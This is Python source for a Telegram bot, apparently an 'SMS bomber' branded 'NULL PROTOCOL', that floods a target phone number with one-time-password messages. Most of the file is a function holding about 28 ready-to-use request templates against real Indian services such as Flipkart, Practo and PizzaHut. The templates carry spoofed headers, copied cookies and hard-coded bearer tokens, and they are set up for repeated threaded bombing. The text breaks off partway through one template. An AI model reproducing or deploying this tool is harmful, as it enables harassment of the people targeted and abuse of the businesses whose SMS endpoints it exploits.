import os
import logging
import asyncio
import json
import io
import threading
import time
import random
import requests
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode
import aiohttp
from database import (
    init_db, add_user, is_admin, is_owner, ban_user, unban_user, delete_user,
    get_all_users_paginated, get_recent_users_paginated, get_user_by_id,
    update_user_target, get_user_target, set_admin_role, get_user_count, get_all_user_ids,
    update_user_phone, get_user_phone
)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "0"))
PORT = int(os.getenv("PORT", 10000))
WEBHOOK_URL = os.getenv("RENDER_EXTERNAL_URL")
if not WEBHOOK_URL:
    WEBHOOK_URL = "https://bomber-2hra.onrender.com"

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ------------------------------
# MarkdownV2 escape function
# ------------------------------
def escape_md(text: str) -> str:
    """Escape special characters for Telegram MarkdownV2."""
    chars = r'_*[]()~`>#+-=|{}.!'
    for ch in chars:
        text = text.replace(ch, '\\' + ch)
    return text

# Branding (escaped)
BRANDING_RAW = "Powered by NULL PROTOCOL"
BRANDING = f"\n\n🤖 **{escape_md(BRANDING_RAW)}**"

# ------------------------------
# Bombing configuration
# ------------------------------
API_INDICES = list(range(31))
DEFAULT_COUNTRY_CODE = "91"
BOMBING_INTERVAL_SECONDS = 8
MIN_INTERVAL = 1
MAX_INTERVAL = 60
MAX_REQUEST_LIMIT = 900000000000
TELEGRAM_RATE_LIMIT_SECONDS = 5
AUTO_STOP_SECONDS = 20 * 60          # 20 minutes

bombing_active = {}          # user_id -> threading.Event
bombing_threads = {}         # user_id -> list of threads
user_intervals = {}          # user_id -> current interval
user_start_time = {}         # user_id -> start timestamp
global_request_counter = threading.Lock()
request_counts = {}          # user_id -> total requests

session = requests.Session()
BASE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*'
}

# ------------------------------------------------------------------
# getapi() – 31 API endpoints (full version)
# ------------------------------------------------------------------
def getapi(pn, lim, cc):
    cc = str(cc)
    pn = str(pn)
    lim = int(lim)

    url_urllib = [
        "https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" + str(cc) + "&nod=4&phone=" + pn, 
        "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=" + pn, 
        "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + pn
    ]
    
    if lim < len(url_urllib):
        try:
            urllib.request.urlopen(str(url_urllib[lim]), timeout=5)
            return True
        except (urllib.error.HTTPError, urllib.error.URLError, Exception):
            return False
    
    try:
        if lim == 3: # PharmEasy
            headers = {
                'Host': 'pharmeasy.in', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
                'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://pharmeasy.in/', 'Content-Type': 'application/json', 'Connection': 'keep-alive',
            }
            data = {"contactNumber":pn}
            response = session.post('https://pharmeasy.in/api/auth/requestOTP', headers=headers, json=data, timeout=5)
            return response.status_code == 200
        
        elif lim == 4: # Hero MotoCorp 
            cookies = {
                '_ga': 'GA1.2.1273460610.1561191565', '_gid': 'GA1.2.172574299.1561191565',
                'PHPSESSID': 'm5tap7nr75b2ehcn8ur261oq86',
            }
            headers={
                'Host': 'www.heromotocorp.com', 'Connection': 'keep-alive', 'Accept': '*/*', 
                'Origin': 'https://www.heromotocorp.com', 'X-Requested-With': 'XMLHttpRequest', 
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 
                'Referer': 'https://www.heromotocorp.com/en-in/xpulse200/', 'Accept-Encoding': 'gzip, deflate, br', 
                'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
            }
            data = {
              'mobile_no': pn, 'randome': 'ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=',
              'mobile_no_otp': '', 'csrf': '523bc3fa1857c4df95e4d24bbd36c61b'
            }
            response = session.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200

        elif lim == 5: # IndiaLends
            cookies = {
                '_ga': 'GA1.2.1483885314.1559157646', '_fbp': 'fb.1.1559157647161.1989205138', 
                'ASP.NET_SessionId': 'ioqkek5lbgvldlq4i3cmijcs', '_gid': 'GA1.2.969623705.1560660444',
            }
            headers = {
                'Host': 'indialends.com', 'Connection': 'keep-alive', 'Accept': '*/*', 
                'Origin': 'https://indialends.com', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36', 
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 
                'Referer': 'https://indialends.com/personal-loan', 'Accept-Encoding': 'gzip, deflate, br', 
                'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
            }
            data = {
              'aeyder03teaeare': '1', 'ertysvfj74sje': cc, 'jfsdfu14hkgertd': pn, 'lj80gertdfg': '0'
            }
            response = session.post('https://indialends.com/internal/a/mobile-verification_v2.ashx', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200

        elif lim == 6: # Flipkart 1
            headers = {
            'host': 'www.flipkart.com', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0', 
            'accept': '*/*', 'accept-language': 'en-US,en;q=0.5', 'accept-encoding': 'gzip, deflate, br', 
            'referer': 'https://www.flipkart.com/', 'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop', 
            'origin': 'https://www.flipkart.com', 'connection': 'keep-alive', 
            'Content-Type': 'application/json; charset=utf-8'}
            data = {"loginId":[f"+{cc}{pn}"],"supportAllStates":True} 
            response = session.post('https://www.flipkart.com/api/6/user/signup/status', headers=headers, json=data, timeout=5)
            return response.status_code == 200
        
        elif lim == 7: # Flipkart 2 
            cookies = {
                'T': 'BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050', 'SWAB': 'build-44be9e47461a74d737914207bcbafc30', 
                'lux_uid': '155867904381892986', 'AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg': '1',
            }
            headers = {
                'Host': 'www.flipkart.com', 'Connection': 'keep-alive', 'X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop', 
                'Origin': 'https://www.flipkart.com', 'Save-Data': 'on', 
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36', 
                'Content-Type': 'application/x-www-form-urlencoded', 'Accept': '*/*', 
                'Referer': 'https://www.flipkart.com/', 'Accept-Encoding': 'gzip, deflate, br', 
                'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
            }
            data = {
              'loginId': f'+{cc}{pn}', 'state': 'VERIFIED', 'churnEmailRequest': 'false'
            }
            response = session.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200
        
        elif lim == 8: # Lenskart
            headers = {
                'Host': 'www.ref-r.com', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0', 
                'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'en-US,en;q=0.5', 
                'Accept-Encoding': 'gzip, deflate, br', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 
                'X-Requested-With': 'XMLHttpRequest', 'DNT': '1', 'Connection': 'keep-alive',
            }
            data = {'mobile': pn, 'submit': '1', 'undefined': ''}
            response = session.post('https://www.ref-r.com/clients/lenskart/smsApi', headers=headers, data=data, timeout=5)
            return response.status_code == 200

        elif lim == 9: # Practo 
            headers = {
                'X-DROID-VERSION': '4.12.5', 'API-Version': '2.0', 'user-agent': 'samsung SM-G9350 0 4.4.2', 
                'client-version': 'Android-4.12.5', 'X-DROID-VERSION-CODE': '158', 'Accept': 'application/json', 
                'client-name': 'Practo Android App', 'Content-Type': 'application/x-www-form-urlencoded', 
                'Host': 'accounts.practo.com', 'Connection': 'Keep-Alive', }
            data = {
              'client_name': 'Practo Android App', 'mobile': f'+{cc}{pn}', 'fingerprint': '', 'device_name':'samsung+SM-G9350'}
            response = session.post( "https://accounts.practo.com/send_otp", headers=headers, data=data, timeout=5)
            return "success" in response.text.lower()

        elif lim == 10: # PizzaHut 
            headers = {
                'Host': 'm.pizzahut.co.in', 'content-length': '114', 'origin': 'https://m.pizzahut.co.in', 
                'authorization': 'Bearer ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SmtZWFJoSWpwN0luUnZhMlZ1SWpvaWIzQXhiR0pyZEcxbGRYSTBNWEJyTlRGNWNqQjBkbUZsSWl3aVlYVjBhQ0k2SW1WNVNqQmxXRUZwVDJsS1MxWXhVV2xNUTBwb1lrZGphVTlwU2tsVmVra3hUbWxLT1M1bGVVcDFXVmN4YkdGWFVXbFBhVWt3VGtSbmFVeERTbmRqYld4MFdWaEtOVm96U25aa1dFSjZZVmRSYVU5cFNUVlBSMUY0VDBkUk5FMXBNV2xaVkZVMVRGUlJOVTVVWTNSUFYwMDFUV2t3ZWxwcVp6Vk5ha0V6V1ZSTk1GcHFXV2xNUTBwd1l6Tk5hVTlwU205a1NGSjNUMms0ZG1RelpETk1iVEZvWTI1U2NWbFhUbkpNYlU1MllsTTVhMXBZV214aVJ6bDNXbGhLYUdOSGEybE1RMHBvWkZkUmFVOXBTbTlrU0ZKM1QyazRkbVF6WkROTWJURm9ZMjVTY1ZsWFRuSk1iVTUyWWxNNWExcFlXbXhpUnpsM1dsaEthR05IYTJsTVEwcHNaVWhCYVU5cVJURk9WR3MxVG5wak1VMUVVWE5KYlRWcFdtbEpOazFVVlRGUFZHc3pUWHByZDA1SU1DNVRaM1p4UmxOZldtTTNaSE5iTVdSNGJWVkdkSEExYW5WMk9FNTVWekIyZDE5TVRuTkJNbWhGVkV0eklpd2lkWEJrWVhSbFpDSTZNVFUxT1RrM016a3dORFUxTnl3aWRYTmxja2xrSWpvaU1EQXdNREF3TURBdE1EQXdNQzB3TURBd0xUQXdNREF0TURBd01EQXdNREF3TURBd0lpd2laMlZ1WlhKaGRHVmtJam94TlRVNU9UY3pPVEEwTlRVM2ZTd2lhV0YwSWpveE5UVTVPVGN6T1RBMExDSmxlSEFpT2pFMU5qQTRNemM1TURSOS5CMGR1NFlEQVptTGNUM0ZHM0RpSnQxN3RzRGlJaVZkUFl4ZHIyVzltenk4', 
                'x-source-origin': 'PWAFW', 'content-type': 'application/json', 'accept': 'application/json, text/plain, */*', 
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36', 
                'save-data': 'on', 'languagecode': 'en', 'referer': 'https://m.pizzahut.co.in/login', 
                'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6', 'cookie': 'AKA_A2=A'}
            data = {"customer":{"MobileNo":pn,"UserName":pn,"merchantId":"98d18d82-ba59-4957-9c92-3f89207a34f6"}}
            response = session.post('https://m.pizzahut.co.in/api/cart/send-otp?langCode=en', headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 11: # Goibibo
            headers = {
                'host': 'www.goibibo.com', 'user-agent': 'Mozilla/5.0 (Windows NT 8.0; Win32; x32; rv:58.0) Gecko/20100101 Firefox/57.0', 
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.5', 
                'accept-encoding': 'gzip, deflate, br', 'referer': 'https://www.goibibo.com/mobile/?sms=success', 
                'content-type': 'application/x-www-form-urlencoded', 'connection': 'keep-alive', 
                'upgrade-insecure-requests': '1'}
            data = {'mbl': pn}
            response = session.post('https://www.goibibo.com/common/downloadsms/', headers=headers, data=data, timeout=5)
            return response.status_code == 200
        
        elif lim == 12: # Apollo Pharmacy
            headers = {
                'Host': 'www.apollopharmacy.in', 'accept': '*/*', 
                'origin': 'https://www.apollopharmacy.in', 'x-requested-with': 'XMLHttpRequest', 'save-data': 'on', 
                'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36', 
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 
                'referer': 'https://www.apollopharmacy.in/sociallogin/mobile/login/', 
                'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6', 
                'cookie': 'section_data_ids=%7B%22cart%22%3A1560239751%7D'}
            data = {'mobile': pn}
            response = session.post('https://www.apollopharmacy.in/sociallogin/mobile/sendotp/', headers=headers, data=data, timeout=5)
            return "sent" in response.text.lower()

        elif lim == 13: # Ajio 
            headers = {
                'Host': 'www.ajio.com', 'Connection': 'keep-alive', 'Accept': 'application/json',
                'Origin': 'https://www.ajio.com', 'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
                'content-type': 'application/json', 'Referer': 'https://www.ajio.com/signup',
                'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6'}
            data = {"firstName":"SpeedX","login":"johnyaho@gmail.com","password":"Rock@5star","genderType":"Male","mobileNumber":pn,"requestType":"SENDOTP"}
            response = session.post('https://www.ajio.com/api/auth/signupSendOTP', headers=headers, json=data, timeout=5)
            return '"statusCode":"1"' in response.text

        elif lim == 14: # AltBalaji
            headers = {
                'Host': 'api.cloud.altbalaji.com', 'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*',
                'Origin': 'https://lite.altbalaji.com', 'Save-Data': 'on',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36',
                'Content-Type': 'application/json;charset=UTF-8', 'Referer': 'https://lite.altbalaji.com/subscribe?progress=input',
                'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6'}
            data = {"country_code":cc,"phone_number":pn}
            response = session.post('https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN', headers=headers, json=data, timeout=5)
            return response.text == '24f467b24087ff48c96321786d89c69f'

        elif lim == 15: # Aala 
            headers = {
                'Host': 'www.aala.com', 'Connection': 'keep-alive', 'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Origin': 'https://www.aala.com', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'https://www.aala.com/',
                'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5'}
            data = {'email': f'{cc}{pn}', 'firstname': 'SpeedX', 'lastname': 'SpeedX'}
            response = session.post('https://www.aala.com/accustomer/ajax/getOTP', headers=headers, data=data, timeout=5)
            return 'code:' in response.text

        elif lim == 16: # Grab
            data = {
              'method': 'SMS', 'countryCode': 'id', 'phoneNumber': f'{cc}{pn}', 'templateID': 'pax_android_production'
            }
            response = session.post('https://api.grab.com/grabid/v1/phone/otp', data=data, timeout=5)
            return response.status_code == 200

        elif lim == 17: # GheeAPI (gokwik.co - 19g6im8srkz9y)
            headers = {
              "accept": "application/json, text/plain, */*", 
              "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyNDY4NywiZXhwIjoxNzU3NTI0NzQ3fQ.xkq3U9_Z0nTKhidL6rZ-N8PXMJOD2jo6II-v3oCtVYo",
              "content-type": "application/json", 
              "gk-merchant-id": "19g6im8srkz9y", 
              "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 18: # EdzAPI (gokwik.co - 19an4fq2kk5y)
            headers = {
              "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzMzc1OCwiZXhwIjoxNzU3NDMzODE4fQ._L8MBwvDff7ijaweocA302oqIA8dGOsJisPydxytvf8",
              "content-type": "application/json", 
              "gk-merchant-id": "19an4fq2kk5y"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200
            
        elif lim == 19: # FalconAPI (api.breeze.in)
            headers = {
              "Content-Type": "application/json", 
              "x-device-id": "A1pKVEDhlv66KLtoYsml3", 
              "x-session-id": "MUUdODRfiL8xmwzhEpjN8"
            }
            data = {
                "phoneNumber": pn,
                "authVerificationType": "otp",
                "device": {"id": "A1pKVEDhlv66KLtoYsml3", "platform": "Chrome", "type": "Desktop"},
                "countryCode": f"+{cc}"
            }
            response = session.post("https://api.breeze.in/session/start", headers=headers, json=data, timeout=5)
            return response.status_code == 200

        elif lim == 20: # NeclesAPI (gokwik.co - 19g6ilhej3mfc)
            headers = {
              "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzNTg0OCwiZXhwIjoxNzU3NDM1OTA4fQ._37TKeyXUxkMEEteU2IIVeSENo8TXaNv32x5rWaJbzA", 
              "Content-Type": "application/json", 
              "gk-merchant-id": "19g6ilhej3mfc", 
              "gk-signature": "645574", 
              "gk-timestamp": "58581194"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200
            
        elif lim == 21: # KisanAPI (oidc.agrevolution.in)
            headers = {
              "Content-Type": "application/json"
            }
            data = {"mobile_number": pn, "client_id": "kisan-app"}
            response = session.post("https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", headers=headers, json=data, timeout=5)
            return response.status_code == 200 or "true" in response.text.lower()
            
        elif lim == 22: # PWAPI (api.penpencil.co)
            headers = {
              "Accept": "*/*", 
              "Content-Type": "application/json", 
              "randomid": "de6f4924-22f5-42f5-ad80-02080277eef7"
            }
            data = {
                "mobile": pn,
                "organizationId": "5eb393ee95fab7468a79d189"
            }
            response = session.post("https://api.penpencil.co/v1/users/resend-otp?smsType=2", headers=headers, json=data, timeout=5)
            return response.status_code == 200
            
        elif lim == 23: # KahatBook (api.khatabook.com)
            headers = {
              "Content-Type": "application/json", 
              "x-kb-app-locale": "en", 
              "x-kb-app-name": "Khatabook Website", 
              "x-kb-app-version": "000100", 
              "x-kb-new-auth": "false", 
              "x-kb-platform": "web"
            }
            data = {
                "country_code": f"+{cc}",
                "phone": pn,
                "app_signature": "Jc/Zu7qNqQ2"
            }
            response = session.post("https://api.khatabook.com/v1/auth/request-otp", headers=headers, json=data, timeout=5)
            return response.status_code == 200 or "success" in response.text.lower()
            
        elif lim == 24: # JockeyAPI (www.jockey.in)
            cookies = {
                "localization": "IN", "_shopify_y": "6556c530-8773-4176-99cf-f587f9f00905", 
                "_tracking_consent": "3.AMPS_INUP_f_f_4MXMfRPtTkGLORLJPTGqOQ", "_ga": "GA1.1.377231092.1757430108", 
                "_fbp": "fb.1.1757430108545.190427387735094641", "_quinn-sessionid": "a2465823-ceb3-4519-9f8d-2a25035dfccd", 
                "cart": "hWN2mTp3BwfmsVi0WqKuawTs?key=bae7dea0fc1b412ac5fceacb96232a06", 
                "wishlist_id": "7531056362789hypmaaup", "wishlist_customer_id": "0", 
                "_shopify_s": "d4985de8-eb08-47a0-9f41-84adb52e6298"
            }
            headers = {
                "accept": "*/*", 
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
                "origin": "https://www.jockey.in", 
                "referer": "https://www.jockey.in/"
            }
            url = f"https://www.jockey.in/apps/jotp/api/login/send-otp/+{cc}{pn}?whatsapp=true"
            response = session.get(url, headers=headers, cookies=cookies, timeout=5)
            return response.status_code == 200

        elif lim == 25: # FasiinAPI (gokwik.co - 19kc37zcdyiu)
            headers = {
              "Content-Type": "application/json", 
              "Accept": "application/json", 
              "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyMTM5OSwiZXhwIjoxNzU3NTIxNDU5fQ.XWlps8Al--idsLa1OYcGNcjgeRk5Zdexo2goBZc1BNA", 
              "gk-merchant-id": "19kc37zcdyiu", 
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
            }
            data = {"phone": pn, "country": "IN"}
            response = session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers=headers, json=data, timeout=5)
            return response.status_code == 200
        
        # 26: VidyaKul
        elif lim == 26: 
            cookies = {
                'gcl_au': '1.1.1308751201.1759726082', 
                'initialTrafficSource': 'utmcsr=live|utmcmd=organic|utmccn=(not set)|utmctr=(not provided)', 
                '__utmzzses': '1', 
                '_fbp': 'fb.1.1759726083644.475815529335417923', 
                '_ga': 'GA1.2.921745508.1759726084', 
                '_gid': 'GA1.2.1800835709.1759726084', 
                '_gat_UA-106550841-2': '1', 
                '_hjSession_2242206': 'eyJpZCI6ImQ0ODFkMjIwLTQwMWYtNDU1MC04MjZhLTRlNWMxOGY4YzEyYSIsImMiOjE3NTk3MjYwODQyMDMsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=', 
                'trustedsite_visit': '1', 
                'ajs_anonymous_id': '1681028f-79f7-458e-bf04-00aacdefc9d3', 
                '_hjSessionUser_2242206': 'eyJpZCI6IjZhNWE4MzJlLThlMzUtNTNjNy05N2ZjLTI0MzNmM2UzNjllMSIsImNyZWF0ZWQiOjE3NTk3MjYwODQyMDEsImV4aXN0aW5nIjp0cnVlfQ==', 
                'vidyakul_selected_languages': 'eyJpdiI6IkJzY1FUdUlodlRMVXhCNnE5V2RDT1E9PSIsInZhbHVlIjoiTTBcL2RKNmU2b1Fab1BnS3FqSDBHQktQVlk0SXRmczIxSGJrakhOaTJ5dllyclZiTk5FeVBGREE3dzVJbXI5T0oiLCJtYWMiOiI5MWU4NDViZDVhOTFjM2NmMmYyZjYwMmRiMmQyNGU4NTRlYjQ0MGM3ZTJmNjIzM2Q2M2ZhNTM0ZTVjMGUzZmUyIn0%3D', 
                'WZRK_S_4WZ-K47-ZZ6Z': '%7B%22p%22%3A3%7D', 
                'vidyakul_selected_stream': 'eyJpdiI6Ik0rb3pnN0gwc21pb1JsbktKNkdXOFE9PSIsInZhbHVlIjoibE9rWGhTXC8xQk1OektzXC9zNXlcLzloR0xjQ2hCMU5nT2pobU0rMU1FbjNSOD0iLCJtYWMiOiJiZjY4MWFhNWM2YzE4ZmViMDhlNWI2OGQ5YmNjM2I3NjNhOTJhZDc5ZDk3ZWE1MGM5OTA4MTA5ODhmMjRkZjk2In0%3D', 
                '_ga_53F4FQTTGN': 'GS2.2.s1759726084$o1$g1$t1759726091$j53$l0$h0', 
                'mp_d3dd7e816ab59c9f9ae9d76726a5a32b_mixpanel': '%7B%22distinct_id%22%3A%22%24device%3A7b73c978-9b57-45d5-93e0-ec5d59c6bf4f%22%2C%22%24device_id%22%3A%227b73c978-9b57-45d5-93e0-ec5d59c6bf4f%22%2C%22mp_lib%22%3A%22Segment%3A%20web%22%2C%22%24search_engine%22%3A%22bing%22%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fwww.bing.com%2F%22%2C%22%24initial_referring_domain%22%3A%22www.bing.com%22%2C%22mps%22%3A%7B%7D%2C%22mpso%22%3A%7B%22%24initial_referrer%22%3A%22https%3A%2F%2Fwww.bing.com%2F%22%2C%22%24initial_referring_domain%22%3A%22www.bing.com%22%7D%2C%22mpus%22%3A%7B%7D%2C%22mpa%22%3A%7B%7D%2C%22mpu%22%3A%7B%7D%2C%22mpr%22%3A%5B%5D%2C%22_mpap%22%3A%5B%5D%7D', 
                'XSRF-TOKEN': 'eyJpdiI6IjFTYW9wNmVJQjY3TFpEU2RYeEdNbkE9PSIsInZhbHVlIjoidmErTnBFcU1JVHpFN2daOENRVG9aQ1RNU25tZnQ1dkM2M1hkQitSdVZRNGxtZUVpTFNvbjM2NlwvVEpLTkFqcCtiTHhNbjVDZWhSK3h1VytGQ0NiRFRRPT0iLCJtYWMiOiI1ZjM3ZDk1YzMwZTYzOTMzM2YwYzFhYTgyNjYzZDRmYWE4ZWQwMDdhYzM1MTdlM2NkNjgzZTNjNWNjZmI2ZWQ4In0%3D', 
                'vidyakul_session': 'eyJpdiI6IlNDQWNpU2ZXMTEraENaaGtsQkJPMmc9PSIsInZhbHVlIjoicXFRbWVqNXhiejlwTFFpXC9OVmdWQkZsODhjUVpvenE0eTB3cGFiQ2F4ckx5Y3dcL3Z1S1NmNnhRNEduV01WT3Q1d2pKMlF3blpySU5YUU5vUldFTFI1dz09IiwibWFjIjoiOWFjNTM1NmQyMTg2YWE0MGZiMzljOGM0MDMzZjc4NWQyNzM0NTU4MzhkZjczNjU3OGNhNGM0Yjg2ZTEwZTJhMSJ9'
            }
            headers = {
              'accept': 'application/json, text/javascript, */*; q=0.01', 
              'accept-language': 'en-US,en;q=0.9', 
              'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 
              'origin': 'https://vidyakul.com', 
              'referer': 'https://vidyakul.com/explore-courses/class-10th/english-medium-biharboard', 
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0', 
              'x-csrf-token': 'fu4xrNYdXZbb2oT2iuHvjVtMyDw5WNFaeuyPSu7Q', 
              'x-requested-with': 'XMLHttpRequest'
            }
            data = {'phone': pn, 'rcsconsent': 'true'}
            response = session.post('https://vidyakul.com/signup-otp/send', headers=headers, cookies=cookies, data=data, timeout=5)
            return response.status_code == 200 or '"status":"success"' in response.text.lower()
        
        # 27: Aditya Birla Capital
        elif lim == 27: 
            cookies = {
                '_gcl_au': '1.1.781134033.1759810407', 
                '_gid': 'GA1.2.1720693822.1759810408', 
                'sess_map': 'eqzbxwcubfayctusrydzbesabydweezdbateducxxdcrxstydtyzrbrtzsuqbdaswwuffravtvutuzuqcsvrtescduettszavexcraaevefqbwccdwvqucftswtzqxtbafdfycqwuqvryswywubrayfrbbfcszcywqsdyauttdaaybsq', 
                '_ga': 'GA1.3.1436666301.1759810408', 
                'WZRK_G': 'd74161bab0c042e8a9f0036c8570fe44', 
                'mfKey': '14m4ctv.1759810410656', 
                '_ga_DBHTXT8G52': 'GS2.1.s1759810408$o1$g1$t1759810411$j57$l0$h328048196', 
                '_uetsid': 'fc23aaa0a33311f08dc6ad31d162998d', 
                '_uetvid': 'fc23ea50a33311f081d045d889f28285', 
                '_ga_KWL2JXMSG9': 'GS2.1.s1759810411$o1$g1$t1759810814$j54$l0$h0', 
                'WZRK_S_884-575-6R7Z': '%7B%22p%22%3A3%2C%22s%22%3A1759810391%2C%22t%22%3A1759810815%7D'
            }
            headers = {
                'Accept': '/*', 
                'Accept-Language': 'en-US,en;q=0.9', 
